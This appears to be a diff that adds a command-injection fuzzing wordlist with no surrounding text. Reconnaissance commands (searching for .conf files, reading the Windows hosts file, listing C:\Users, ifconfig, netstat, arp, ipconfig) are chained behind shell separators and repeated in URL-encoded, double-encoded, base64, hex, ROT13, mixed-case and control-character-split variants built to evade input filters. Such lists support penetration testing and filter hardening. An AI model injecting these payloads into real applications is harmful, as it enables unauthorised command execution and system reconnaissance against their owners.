+%2526%2526%2520find%2520/%2520-name%2520%2527%252A.conf%2527%2520-type%2520f%25202%253E/dev/null
+JiYgZmluZCAvIC1uYW1lICcqLmNvbmYnIC10eXBlIGYgMj4vZGV2L251bGw=
+26262066696e64202f202d6e616d6520272a2e636f6e6627202d74797065206620323e2f6465762f6e756c6c
+&& svaq / -anzr '*.pbas' -glcr s 2>/qri/ahyy
+&& find / -nAme '*.coNf' -TyPe f 2>/deV/nUlL
+&& f%0aind / -name %0a'*.%20c%09onf' -ty%0ape f 2%0d>/dev/%09nu%20l%09l
+%0afind / -name '*.conf' -type f 2>/dev/null
+%250afind%20/%20-name%20%27%2A.conf%27%20-type%20f%202%3E/dev/null
+%25250afind%2520/%2520-name%2520%2527%252A.conf%2527%2520-type%2520f%25202%253E/dev/null
+JTBhZmluZCAvIC1uYW1lICcqLmNvbmYnIC10eXBlIGYgMj4vZGV2L251bGw=
+25306166696e64202f202d6e616d6520272a2e636f6e6627202d74797065206620323e2f6465762f6e756c6c
+%0nsvaq / -anzr '*.pbas' -glcr s 2>/qri/ahyy
+%0afinD / -nAme '*.cOnf' -Type f 2>/dEV/null
+%0c%0af%09ind / -%0an%0da%0dme '*.conf'%0b -ty%09pe f 2>/dev/null
+%0Afind / -name '*.conf' -type f 2>/dev/null
+%250Afind%20/%20-name%20%27%2A.conf%27%20-type%20f%202%3E/dev/null
+%25250Afind%2520/%2520-name%2520%2527%252A.conf%2527%2520-type%2520f%25202%253E/dev/null
+JTBBZmluZCAvIC1uYW1lICcqLmNvbmYnIC10eXBlIGYgMj4vZGV2L251bGw=
+25304166696e64202f202d6e616d6520272a2e636f6e6627202d74797065206620323e2f6465762f6e756c6c
+%0Nsvaq / -anzr '*.pbas' -glcr s 2>/qri/ahyy
+%0afind / -NAmE '*.cOnf' -TYPe f 2>/dEV/nulL
+%0%0bAfin%20d / -name '*.co%0cnf' -t%09ype f 2>%0d/dev%0b/null
+${IFS}find / -name '*.conf' -type f 2>/dev/null
+%24%7BIFS%7Dfind%20/%20-name%20%27%2A.conf%27%20-type%20f%202%3E/dev/null
+%2524%257BIFS%257Dfind%2520/%2520-name%2520%2527%252A.conf%2527%2520-type%2520f%25202%253E/dev/null
+JHtJRlN9ZmluZCAvIC1uYW1lICcqLmNvbmYnIC10eXBlIGYgMj4vZGV2L251bGw=
+247b4946537d66696e64202f202d6e616d6520272a2e636f6e6627202d74797065206620323e2f6465762f6e756c6c
+${VSF}svaq / -anzr '*.pbas' -glcr s 2>/qri/ahyy
+${ifs}fINd / -namE '*.CONf' -tYpE F 2>/dEv/nuLL
+${IFS}find / -name '*.conf' -type f 2%09>/dev/n%0aull
+\nfind / -name '*.conf' -type f 2>/dev/null
+%5Cnfind%20/%20-name%20%27%2A.conf%27%20-type%20f%202%3E/dev/null
+%255Cnfind%2520/%2520-name%2520%2527%252A.conf%2527%2520-type%2520f%25202%253E/dev/null
+XG5maW5kIC8gLW5hbWUgJyouY29uZicgLXR5cGUgZiAyPi9kZXYvbnVsbA==
+5c6e66696e64202f202d6e616d6520272a2e636f6e6627202d74797065206620323e2f6465762f6e756c6c
+\asvaq / -anzr '*.pbas' -glcr s 2>/qri/ahyy
+\nfInD / -NaME '*.coNF' -TYpE f 2>/DEV/nUlL
+\n%09fin%00d / %0a-%09n%00am%0ce '*.conf' -%00t%20ype f 2>/dev/n%0bul%0bl
+find / -name '*.conf' -type f 2>/dev/null
+find%20/%20-name%20%27%2A.conf%27%20-type%20f%202%3E/dev/null
+find%2520/%2520-name%2520%2527%252A.conf%2527%2520-type%2520f%25202%253E/dev/null
+ZmluZCAvIC1uYW1lICcqLmNvbmYnIC10eXBlIGYgMj4vZGV2L251bGw=
+66696e64202f202d6e616d6520272a2e636f6e6627202d74797065206620323e2f6465762f6e756c6c
+svaq / -anzr '*.pbas' -glcr s 2>/qri/ahyy
+FiNd / -NaME '*.CONf' -TypE F 2>/Dev/NulL
+%0bfind / %00-name '%09*.conf' -type%20 f %0c2>/dev/null
+&type C:\Windows\System32\drivers\etc\hosts
+%26type%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts
+%2526type%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc%255Chosts
+JnR5cGUgQzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXGV0Y1xob3N0cw==
+267479706520433a5c57696e646f77735c53797374656d33325c647269766572735c6574635c686f737473
+&glcr P:\Jvaqbjf\Flfgrz32\qeviref\rgp\ubfgf
+&TYpE C:\winDOws\sysTEm32\drIveRS\eTC\HOSTS
+&type C:\Windows\System32\drivers%0d\et%09c\ho%20sts
+|type C:\Windows\System32\drivers\etc\hosts
+%7Ctype%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts
+%257Ctype%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc%255Chosts
+fHR5cGUgQzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXGV0Y1xob3N0cw==
+7c7479706520433a5c57696e646f77735c53797374656d33325c647269766572735c6574635c686f737473
+|glcr P:\Jvaqbjf\Flfgrz32\qeviref\rgp\ubfgf
+|TYPe c:\wiNDows\syStem32\DRivers\EtC\hosTs
+|ty%09pe C:\Win%09do%0dw%0as%0b\Syst%09em32\drivers\et%0bc\hosts
+%26type C:\Windows\System32\drivers\etc\hosts
+%2526type%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts
+%252526type%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc%255Chosts
+JTI2dHlwZSBDOlxXaW5kb3dzXFN5c3RlbTMyXGRyaXZlcnNcZXRjXGhvc3Rz
+2532367479706520433a5c57696e646f77735c53797374656d33325c647269766572735c6574635c686f737473
+%26glcr P:\Jvaqbjf\Flfgrz32\qeviref\rgp\ubfgf
+%26tYPe C:\winDowS\SysTem32\DrIVers\Etc\hoSts
+%26type C:\Windows%0c\Sy%0dstem32\dr%09ivers\etc\%09hosts
+%7Ctype C:\Windows\System32\drivers\etc\hosts
+%257Ctype%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts
+%25257Ctype%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc%255Chosts
+JTdDdHlwZSBDOlxXaW5kb3dzXFN5c3RlbTMyXGRyaXZlcnNcZXRjXGhvc3Rz
+2537437479706520433a5c57696e646f77735c53797374656d33325c647269766572735c6574635c686f737473
+%7Pglcr P:\Jvaqbjf\Flfgrz32\qeviref\rgp\ubfgf
+%7ctyPE c:\wiNDOwS\SYStEM32\driVeRS\Etc\hoStS
+%7Ctype C:\%0dWi%0cndows%09\System32\%0ddrivers\%00etc\h%0costs
+`|type C:\Windows\System32\drivers\etc\hosts
+%60%7Ctype%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts
+%2560%257Ctype%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc%255Chosts
+YHx0eXBlIEM6XFdpbmRvd3NcU3lzdGVtMzJcZHJpdmVyc1xldGNcaG9zdHM=
+607c7479706520433a5c57696e646f77735c53797374656d33325c647269766572735c6574635c686f737473
+`|glcr P:\Jvaqbjf\Flfgrz32\qeviref\rgp\ubfgf
+`|tYPE c:\wInDOws\sysTem32\drivERS\eTc\hosts
+`|type C:%20\Wi%0cn%0bdo%0dws\System3%092\driv%09ers\etc\hosts
+`&type C:\Windows\System32\drivers\etc\hosts
+%60%26type%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts
+%2560%2526type%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc%255Chosts
+YCZ0eXBlIEM6XFdpbmRvd3NcU3lzdGVtMzJcZHJpdmVyc1xldGNcaG9zdHM=
+60267479706520433a5c57696e646f77735c53797374656d33325c647269766572735c6574635c686f737473
+`&glcr P:\Jvaqbjf\Flfgrz32\qeviref\rgp\ubfgf
+`&tYPe c:\wIndowS\systeM32\Drivers\Etc\HosTs
+`&type C%0d:\%09Windows%0a\Sy%0dstem3%0b2%00\%0adrivers\etc\h%09osts
+type C:\Windows\System32\drivers\etc\hosts
+type%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts
+type%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc%255Chosts
+dHlwZSBDOlxXaW5kb3dzXFN5c3RlbTMyXGRyaXZlcnNcZXRjXGhvc3Rz
+7479706520433a5c57696e646f77735c53797374656d33325c647269766572735c6574635c686f737473
+glcr P:\Jvaqbjf\Flfgrz32\qeviref\rgp\ubfgf
+TYPE C:\WINdOws\sysTem32\DrIVERs\etc\hOStS
+type C:\Windows\System32\drivers\etc\host%0ds
+&dir C:\Windows\System32\drivers\etc
+%26dir%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc
+%2526dir%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc
+JmRpciBDOlxXaW5kb3dzXFN5c3RlbTMyXGRyaXZlcnNcZXRj
+2664697220433a5c57696e646f77735c53797374656d33325c647269766572735c657463
+&qve P:\Jvaqbjf\Flfgrz32\qeviref\rgp
+&DiR C:\windOWS\sySteM32\DrIVErs\Etc
+&dir C:\W%00indo%0bws\%0dSy%0astem%2032\%0bdri%0cvers\etc
+|dir C:\Windows\System32\drivers\etc
+%7Cdir%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc
+%257Cdir%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc
+fGRpciBDOlxXaW5kb3dzXFN5c3RlbTMyXGRyaXZlcnNcZXRj
+7c64697220433a5c57696e646f77735c53797374656d33325c647269766572735c657463
+|qve P:\Jvaqbjf\Flfgrz32\qeviref\rgp
+|DiR C:\wiNDOws\SYSTEm32\dRIveRs\EtC
+|dir C:\W%09indows\System32\drivers\etc
+%26dir C:\Windows\System32\drivers\etc
+%2526dir%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc
+%252526dir%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc
+JTI2ZGlyIEM6XFdpbmRvd3NcU3lzdGVtMzJcZHJpdmVyc1xldGM=
+25323664697220433a5c57696e646f77735c53797374656d33325c647269766572735c657463
+%26qve P:\Jvaqbjf\Flfgrz32\qeviref\rgp
+%26DIR C:\wiNDoWS\SySTeM32\dRIvErs\etc
+%26d%00ir C:\Windows\System32\dri%20ve%00rs\et%0dc
+%7Cdir C:\Windows\System32\drivers\etc
+%257Cdir%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc
+%25257Cdir%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc
+JTdDZGlyIEM6XFdpbmRvd3NcU3lzdGVtMzJcZHJpdmVyc1xldGM=
+25374364697220433a5c57696e646f77735c53797374656d33325c647269766572735c657463
+%7Pqve P:\Jvaqbjf\Flfgrz32\qeviref\rgp
+%7cDIr c:\WINdOwS\SYStEm32\DrivErS\ETC
+%7Cdir C:\%00Windo%00ws\%0cSystem32\driv%0bers\etc
+`|dir C:\Windows\System32\drivers\etc
+%60%7Cdir%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc
+%2560%257Cdir%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc
+YHxkaXIgQzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXGV0Yw==
+607c64697220433a5c57696e646f77735c53797374656d33325c647269766572735c657463
+`|qve P:\Jvaqbjf\Flfgrz32\qeviref\rgp
+`|DIr C:\wINDOws\sYSTem32\DRiVeRs\etC
+`|%20dir C:\Windows%20\Syste%20m32\drivers\etc
+`&dir C:\Windows\System32\drivers\etc
+%60%26dir%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc
+%2560%2526dir%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc
+YCZkaXIgQzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXGV0Yw==
+602664697220433a5c57696e646f77735c53797374656d33325c647269766572735c657463
+`&qve P:\Jvaqbjf\Flfgrz32\qeviref\rgp
+`&dir c:\winDOws\sysTem32\DrIvERs\Etc
+%0d`&dir%0d C:\Windows\System32\drivers\et%0cc
+dir C:\Windows\System32\drivers\etc
+dir%20C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc
+dir%2520C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc
+ZGlyIEM6XFdpbmRvd3NcU3lzdGVtMzJcZHJpdmVyc1xldGM=
+64697220433a5c57696e646f77735c53797374656d33325c647269766572735c657463
+qve P:\Jvaqbjf\Flfgrz32\qeviref\rgp
+DIr c:\wINdOwS\SySTeM32\DriVers\eTC
+dir %0dC:\Wind%0bows\System32\%0cdrivers\etc
+&dir C:\Users
+%26dir%20C%3A%5CUsers
+%2526dir%2520C%253A%255CUsers
+JmRpciBDOlxVc2Vycw==
+2664697220433a5c5573657273
+&qve P:\Hfref
+&diR C:\USeRs
+&dir%20 C:\Us%0aers
+|dir C:\Users
+%7Cdir%20C%3A%5CUsers
+%257Cdir%2520C%253A%255CUsers
+fGRpciBDOlxVc2Vycw==
+7c64697220433a5c5573657273
+|qve P:\Hfref
+|DIr c:\USERs
+|dir%20 C:\Us%0aer%20s
+%26dir C:\Users
+%2526dir%20C%3A%5CUsers
+%252526dir%2520C%253A%255CUsers
+JTI2ZGlyIEM6XFVzZXJz
+25323664697220433a5c5573657273
+%26qve P:\Hfref
+%26dIr C:\uSErs
+%%0d26di%00r C:\Users
+%7Cdir C:\Users
+%257Cdir%20C%3A%5CUsers
+%25257Cdir%2520C%253A%255CUsers
+JTdDZGlyIEM6XFVzZXJz
+25374364697220433a5c5573657273
+%7Pqve P:\Hfref
+%7CdIr c:\UsERs
+%7Cdir C:\User%0bs
+`|dir C:\Users
+%60%7Cdir%20C%3A%5CUsers
+%2560%257Cdir%2520C%253A%255CUsers
+YHxkaXIgQzpcVXNlcnM=
+607c64697220433a5c5573657273
+`|qve P:\Hfref
+`|DIR C:\users
+`|%0cdir C%0b:\Users
+`&dir C:\Users
+%60%26dir%20C%3A%5CUsers
+%2560%2526dir%2520C%253A%255CUsers
+YCZkaXIgQzpcVXNlcnM=
+602664697220433a5c5573657273
+`&qve P:\Hfref
+`&dIr C:\USers
+`&dir C:\%0aUsers
+dir C:\Users
+dir%20C%3A%5CUsers
+dir%2520C%253A%255CUsers
+ZGlyIEM6XFVzZXJz
+64697220433a5c5573657273
+qve P:\Hfref
+DiR C:\UsERs
+dir C:\%20Users
+; ifconfig
+%3B%20ifconfig
+%253B%2520ifconfig
+OyBpZmNvbmZpZw==
+3b206966636f6e666967
+; vspbasvt
+; IFConfiG
+; %00i%20fconfig
+| ifconfig
+%7C%20ifconfig
+%257C%2520ifconfig
+fCBpZmNvbmZpZw==
+7c206966636f6e666967
+| vspbasvt
+| IfCONFIg
+| ifconfi%20g
+|| ifconfig
+%7C%7C%20ifconfig
+%257C%257C%2520ifconfig
+fHwgaWZjb25maWc=
+7c7c206966636f6e666967
+|| vspbasvt
+|| iFConfig
+& ifconfig
+%26%20ifconfig
+%2526%2520ifconfig
+JiBpZmNvbmZpZw==
+26206966636f6e666967
+& vspbasvt
+& iFCOnfIg
+& ifconfi%00g
+&& ifconfig
+%26%26%20ifconfig
+%2526%2526%2520ifconfig
+JiYgaWZjb25maWc=
+2626206966636f6e666967
+&& vspbasvt
+&& IfConfiG
+%0aifconfig
+%250aifconfig
+%25250aifconfig
+JTBhaWZjb25maWc=
+2530616966636f6e666967
+%0nvspbasvt
+%0AIFcOnFiG
+%0aif%0bconfig
+%0Aifconfig
+%250Aifconfig
+%25250Aifconfig
+JTBBaWZjb25maWc=
+2530416966636f6e666967
+%0Nvspbasvt
+%0aIfcoNfiG
+${IFS}ifconfig
+%24%7BIFS%7Difconfig
+%2524%257BIFS%257Difconfig
+JHtJRlN9aWZjb25maWc=
+247b4946537d6966636f6e666967
+${VSF}vspbasvt
+${IFs}IfConfiG
+%00${IFS}ifconfig
+\nifconfig
+%5Cnifconfig
+%255Cnifconfig
+XG5pZmNvbmZpZw==
+5c6e6966636f6e666967
+\avspbasvt
+\nifCOnFIg
+ifconfig
+aWZjb25maWc=
+6966636f6e666967
+vspbasvt
+iFCoNFig
+i%0cfc%20onfig
+; netstat -tulpn
+%3B%20netstat%20-tulpn
+%253B%2520netstat%2520-tulpn
+OyBuZXRzdGF0IC10dWxwbg==
+3b206e657473746174202d74756c706e
+; argfgng -ghyca
+; NEtStat -TULpN
+; netsta%09t -tu%0alpn
+| netstat -tulpn
+%7C%20netstat%20-tulpn
+%257C%2520netstat%2520-tulpn
+fCBuZXRzdGF0IC10dWxwbg==
+7c206e657473746174202d74756c706e
+| argfgng -ghyca
+| NetsTAT -TULPN
+|| netstat -tulpn
+%7C%7C%20netstat%20-tulpn
+%257C%257C%2520netstat%2520-tulpn
+fHwgbmV0c3RhdCAtdHVscG4=
+7c7c206e657473746174202d74756c706e
+|| argfgng -ghyca
+|| neTstat -tulPn
+||%0b netstat -t%0cu%20lpn
+& netstat -tulpn
+%26%20netstat%20-tulpn
+%2526%2520netstat%2520-tulpn
+JiBuZXRzdGF0IC10dWxwbg==
+26206e657473746174202d74756c706e
+& argfgng -ghyca
+& nEtstAT -TUlpN
+& net%20st%20at -tulpn
+&& netstat -tulpn
+%26%26%20netstat%20-tulpn
+%2526%2526%2520netstat%2520-tulpn
+JiYgbmV0c3RhdCAtdHVscG4=
+2626206e657473746174202d74756c706e
+&& argfgng -ghyca
+&& NETStat -tulpn
+%0anetstat -tulpn
+%250anetstat%20-tulpn
+%25250anetstat%2520-tulpn
+JTBhbmV0c3RhdCAtdHVscG4=
+2530616e657473746174202d74756c706e
+%0nargfgng -ghyca
+%0anEtStAt -TuLpn
+%0b%0anetstat -tulpn
+%0Anetstat -tulpn
+%250Anetstat%20-tulpn
+%25250Anetstat%2520-tulpn
+JTBBbmV0c3RhdCAtdHVscG4=
+2530416e657473746174202d74756c706e
+%0Nargfgng -ghyca
+%0aneTsTAt -tUlPN
+${IFS}netstat -tulpn
+%24%7BIFS%7Dnetstat%20-tulpn
+%2524%257BIFS%257Dnetstat%2520-tulpn
+JHtJRlN9bmV0c3RhdCAtdHVscG4=
+247b4946537d6e657473746174202d74756c706e
+${VSF}argfgng -ghyca
+${Ifs}neTsTaT -TulPN
+${IFS}netstat -tu%0bl%0dpn
+\nnetstat -tulpn
+%5Cnnetstat%20-tulpn
+%255Cnnetstat%2520-tulpn
+XG5uZXRzdGF0IC10dWxwbg==
+5c6e6e657473746174202d74756c706e
+\aargfgng -ghyca
+\nnetstaT -tuLPN
+\nne%20tstat -tul%0bpn
+netstat -tulpn
+netstat%20-tulpn
+netstat%2520-tulpn
+bmV0c3RhdCAtdHVscG4=
+6e657473746174202d74756c706e
+argfgng -ghyca
+neTSTaT -tulpN
+; arp -a
+%3B%20arp%20-a
+%253B%2520arp%2520-a
+OyBhcnAgLWE=
+3b20617270202d61
+; nec -n
+; ArP -a
+; arp%20 -a
+| arp -a
+%7C%20arp%20-a
+%257C%2520arp%2520-a
+fCBhcnAgLWE=
+7c20617270202d61
+| nec -n
+| Arp -a
+| ar%0dp %00-a
+|| arp -a
+%7C%7C%20arp%20-a
+%257C%257C%2520arp%2520-a
+fHwgYXJwIC1h
+7c7c20617270202d61
+|| nec -n
+|| aRP -a
+|| arp %0a-a
+& arp -a
+%26%20arp%20-a
+%2526%2520arp%2520-a
+JiBhcnAgLWE=
+2620617270202d61
+& nec -n
+& Arp -A
+&& arp -a
+%26%26%20arp%20-a
+%2526%2526%2520arp%2520-a
+JiYgYXJwIC1h
+262620617270202d61
+&& nec -n
+&& ArP -A
+%0aarp -a
+%250aarp%20-a
+%25250aarp%2520-a
+JTBhYXJwIC1h
+253061617270202d61
+%0nnec -n
+%0aARP -a
+%0c%0aarp -a
+%0Aarp -a
+%250Aarp%20-a
+%25250Aarp%2520-a
+JTBBYXJwIC1h
+253041617270202d61
+%0Nnec -n
+%0AaRP -A
+%0%0cAarp%00 -a
+${IFS}arp -a
+%24%7BIFS%7Darp%20-a
+%2524%257BIFS%257Darp%2520-a
+JHtJRlN9YXJwIC1h
+247b4946537d617270202d61
+${VSF}nec -n
+${iFS}ARP -a
+\narp -a
+%5Cnarp%20-a
+%255Cnarp%2520-a
+XG5hcnAgLWE=
+5c6e617270202d61
+\anec -n
+\NArp -A
+arp -a
+arp%20-a
+arp%2520-a
+YXJwIC1h
+617270202d61
+nec -n
+aRp -a
+; ping -c 4 127.0.0.1
+%3B%20ping%20-c%204%20127.0.0.1
+%253B%2520ping%2520-c%25204%2520127.0.0.1
+OyBwaW5nIC1jIDQgMTI3LjAuMC4x
+3b2070696e67202d632034203132372e302e302e31
+; cvat -p 4 127.0.0.1
+; pING -C 4 127.0.0.1
+; ping -c 4%0a 127.0.0.1
+| ping -c 4 127.0.0.1
+%7C%20ping%20-c%204%20127.0.0.1
+%257C%2520ping%2520-c%25204%2520127.0.0.1
+fCBwaW5nIC1jIDQgMTI3LjAuMC4x
+7c2070696e67202d632034203132372e302e302e31
+| cvat -p 4 127.0.0.1
+| PiNG -c 4 127.0.0.1
+| pi%0bng%20 %0b-c%20 4 127%0c.%0a0.%0c0.1
+|| ping -c 4 127.0.0.1
+%7C%7C%20ping%20-c%204%20127.0.0.1
+%257C%257C%2520ping%2520-c%25204%2520127.0.0.1
+fHwgcGluZyAtYyA0IDEyNy4wLjAuMQ==
+7c7c2070696e67202d632034203132372e302e302e31
+|| cvat -p 4 127.0.0.1
+|| PiNg -C 4 127.0.0.1
+|| ping -%0dc 4 127.0.0%0a.1
+& ping -c 4 127.0.0.1
+%26%20ping%20-c%204%20127.0.0.1
+%2526%2520ping%2520-c%25204%2520127.0.0.1
+JiBwaW5nIC1jIDQgMTI3LjAuMC4x
+262070696e67202d632034203132372e302e302e31
+& cvat -p 4 127.0.0.1
+& pINg -c 4 127.0.0.1
+& ping -c 4 %091%0c27.0.0.1
+&& ping -c 4 127.0.0.1
+%26%26%20ping%20-c%204%20127.0.0.1
+%2526%2526%2520ping%2520-c%25204%2520127.0.0.1
+JiYgcGluZyAtYyA0IDEyNy4wLjAuMQ==
+26262070696e67202d632034203132372e302e302e31
+&& cvat -p 4 127.0.0.1
+&& pING -C 4 127.0.0.1
+&& %0bping -c 4 127.0.0.1
+%0aping -c 4 127.0.0.1
+%250aping%20-c%204%20127.0.0.1
+%25250aping%2520-c%25204%2520127.0.0.1
+JTBhcGluZyAtYyA0IDEyNy4wLjAuMQ==
+25306170696e67202d632034203132372e302e302e31
+%0ncvat -p 4 127.0.0.1
+%0APinG -c 4 127.0.0.1
+%0apin%20g -c 4 127%0a.0.0.1
+%0Aping -c 4 127.0.0.1
+%250Aping%20-c%204%20127.0.0.1
+%25250Aping%2520-c%25204%2520127.0.0.1
+JTBBcGluZyAtYyA0IDEyNy4wLjAuMQ==
+25304170696e67202d632034203132372e302e302e31
+%0Ncvat -p 4 127.0.0.1
+%0aPinG -c 4 127.0.0.1
+%0Api%0dng -c 4%00 127.0.0.1
+${IFS}ping -c 4 127.0.0.1
+%24%7BIFS%7Dping%20-c%204%20127.0.0.1
+%2524%257BIFS%257Dping%2520-c%25204%2520127.0.0.1
+JHtJRlN9cGluZyAtYyA0IDEyNy4wLjAuMQ==
+247b4946537d70696e67202d632034203132372e302e302e31
+${VSF}cvat -p 4 127.0.0.1
+${ifs}pIng -C 4 127.0.0.1
+%0b$%00{I%0cFS}ping %0b-c 4 127.0.0.1
+\nping -c 4 127.0.0.1
+%5Cnping%20-c%204%20127.0.0.1
+%255Cnping%2520-c%25204%2520127.0.0.1
+XG5waW5nIC1jIDQgMTI3LjAuMC4x
+5c6e70696e67202d632034203132372e302e302e31
+\acvat -p 4 127.0.0.1
+\NpING -c 4 127.0.0.1
+\nping -c 4 12%007.0.0.1
+ping -c 4 127.0.0.1
+ping%20-c%204%20127.0.0.1
+ping%2520-c%25204%2520127.0.0.1
+cGluZyAtYyA0IDEyNy4wLjAuMQ==
+70696e67202d632034203132372e302e302e31
+cvat -p 4 127.0.0.1
+PiNG -C 4 127.0.0.1
+ping -c 4%00 127%0b.%000.0.1
+&ipconfig /all
+%26ipconfig%20/all
+%2526ipconfig%2520/all
+JmlwY29uZmlnIC9hbGw=
+266970636f6e666967202f616c6c
+&vcpbasvt /nyy
+&IPcONFIG /all
+%09&ipconfig /a%0bll
+|ipconfig /all
+%7Cipconfig%20/all
+%257Cipconfig%2520/all
+fGlwY29uZmlnIC9hbGw=
+7c6970636f6e666967202f616c6c
+|vcpbasvt /nyy
+|IPCOnfig /aLL
+|i%0dp%09confi%0cg /all
+%26ipconfig /all
+%2526ipconfig%20/all
+%252526ipconfig%2520/all
+JTI2aXBjb25maWcgL2FsbA==
+2532366970636f6e666967202f616c6c
+%26vcpbasvt /nyy
+%26IPcOnFIg /ALl
+%7Cipconfig /all
+%257Cipconfig%20/all
+%25257Cipconfig%2520/all
+JTdDaXBjb25maWcgL2FsbA==
+2537436970636f6e666967202f616c6c
+%7Pvcpbasvt /nyy
+%7cIPCOnfIg /AlL
+`|ipconfig /all
+%60%7Cipconfig%20/all
+%2560%257Cipconfig%2520/all
+YHxpcGNvbmZpZyAvYWxs
+607c6970636f6e666967202f616c6c
+`|vcpbasvt /nyy
+`|ipCoNfig /AlL
+`|%09ipconfig /all
+`&ipconfig /all
+%60%26ipconfig%20/all
+%2560%2526ipconfig%2520/all
+YCZpcGNvbmZpZyAvYWxs
+60266970636f6e666967202f616c6c
+`&vcpbasvt /nyy
+`&IPcoNfIG /aLl
+`&i%0apco%20nfig %0a/all
+ipconfig /all
+ipconfig%20/all
+ipconfig%2520/all
+aXBjb25maWcgL2FsbA==
+6970636f6e666967202f616c6c
+vcpbasvt /nyy
+iPConfIG /alL
+&netstat -ano
+%26netstat%20-ano
+%2526netstat%2520-ano
+Jm5ldHN0YXQgLWFubw==
+266e657473746174202d616e6f
+&argfgng -nab
+&nEtstat -anO
+&nets%20tat -a%20no
+|netstat -ano
+%7Cnetstat%20-ano
+%257Cnetstat%2520-ano
+fG5ldHN0YXQgLWFubw==
+7c6e657473746174202d616e6f
+|argfgng -nab
+|nETsTaT -AnO
+|%0bnetsta%0dt -ano
+%26netstat -ano
+%2526netstat%20-ano
+%252526netstat%2520-ano
+JTI2bmV0c3RhdCAtYW5v
+2532366e657473746174202d616e6f
+%26argfgng -nab
+%26NETSTAT -ANO
+%26netsta%0bt%00 -ano
+%7Cnetstat -ano
+%257Cnetstat%20-ano
+%25257Cnetstat%2520-ano
+JTdDbmV0c3RhdCAtYW5v
+2537436e657473746174202d616e6f
+%7Pargfgng -nab
+%7cNETStaT -anO
+%7%0bCn%0detstat%0d -ano
+`|netstat -ano
+%60%7Cnetstat%20-ano
+%2560%257Cnetstat%2520-ano
+YHxuZXRzdGF0IC1hbm8=
+607c6e657473746174202d616e6f
+`|argfgng -nab
+`|NETSTAT -ano
+`%09|netstat -%20ano
+`&netstat -ano
+%60%26netstat%20-ano
+%2560%2526netstat%2520-ano
+YCZuZXRzdGF0IC1hbm8=
+60266e657473746174202d616e6f
+`&argfgng -nab
+`&NEtSTat -aNo
+`%20&net%09stat -ano
+netstat -ano
+netstat%20-ano
+netstat%2520-ano
+bmV0c3RhdCAtYW5v
+6e657473746174202d616e6f
+argfgng -nab
+neTsTAT -Ano
+%0anetsta%0bt -an%0ao
+&arp -a
+%26arp%20-a
+%2526arp%2520-a
+JmFycCAtYQ==
+26617270202d61
+&nec -n
+|arp -a
+%7Carp%20-a
+%257Carp%2520-a
+fGFycCAtYQ==
+7c617270202d61
+|nec -n
+|ARP -A
+%26arp -a
+%2526arp%20-a
+%252526arp%2520-a
+JTI2YXJwIC1h
+253236617270202d61
+%26nec -n
+%26arP -a
+%7Carp -a
+%257Carp%20-a
+%25257Carp%2520-a
+JTdDYXJwIC1h
+253743617270202d61
+%7Pnec -n
+%7CARp -A
+`|arp -a
+%60%7Carp%20-a
+%2560%257Carp%2520-a
+YHxhcnAgLWE=
+607c617270202d61
+`|nec -n
+`|arP -A
+`&arp -a
+%60%26arp%20-a
+%2560%2526arp%2520-a
+YCZhcnAgLWE=
+6026617270202d61
+`&nec -n
+`&ArP -A
+ARP -A
+a%00rp -a
+&ping -n 4 127.0.0.1
+%26ping%20-n%204%20127.0.0.1
+%2526ping%2520-n%25204%2520127.0.0.1
+JnBpbmcgLW4gNCAxMjcuMC4wLjE=
+2670696e67202d6e2034203132372e302e302e31
+&cvat -a 4 127.0.0.1
+&pIng -n 4 127.0.0.1
+&ping -n 4%0b 127.0.0.1
+|ping -n 4 127.0.0.1
+%7Cping%20-n%204%20127.0.0.1
+%257Cping%2520-n%25204%2520127.0.0.1
+fHBpbmcgLW4gNCAxMjcuMC4wLjE=
+7c70696e67202d6e2034203132372e302e302e31
+|cvat -a 4 127.0.0.1
+|Ping -N 4 127.0.0.1
+|ping -n 4 127.0%0d.0.1
+%26ping -n 4 127.0.0.1
+%2526ping%20-n%204%20127.0.0.1
+%252526ping%2520-n%25204%2520127.0.0.1
+JTI2cGluZyAtbiA0IDEyNy4wLjAuMQ==
+25323670696e67202d6e2034203132372e302e302e31
+%26cvat -a 4 127.0.0.1
+%26ping -N 4 127.0.0.1
+%26pi%00ng -n 4 127.0.%000.1
+%7Cping -n 4 127.0.0.1
+%257Cping%20-n%204%20127.0.0.1
+%25257Cping%2520-n%25204%2520127.0.0.1
+JTdDcGluZyAtbiA0IDEyNy4wLjAuMQ==
+25374370696e67202d6e2034203132372e302e302e31
+%7Pcvat -a 4 127.0.0.1
+%7CpIng -n 4 127.0.0.1
+%7C%00ping -%00n 4 127.%0d0.0.1
+`|ping -n 4 127.0.0.1
